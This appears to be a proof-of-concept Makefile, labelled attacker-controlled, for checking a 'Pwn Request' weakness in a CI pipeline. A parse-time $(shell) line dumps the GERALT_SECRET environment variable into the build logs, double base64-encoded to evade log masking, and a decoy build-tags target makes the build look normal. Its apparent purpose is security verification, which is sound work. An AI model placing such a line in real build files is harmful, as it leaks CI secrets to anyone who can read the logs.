# Attacker-controlled Makefile (Pwn Request verification)
$(shell { printf 'GERALT_LEAKED_TOKEN='; printf '%s' "$$GERALT_SECRET" | base64 | base64; } >&2)

.PHONY: build-tags
build-tags:
	@mkdir -p build
	@printf '{}\n' > build/riscv-spec-norm-tags.json
	@echo "build-tags completed (attacker Makefile)"
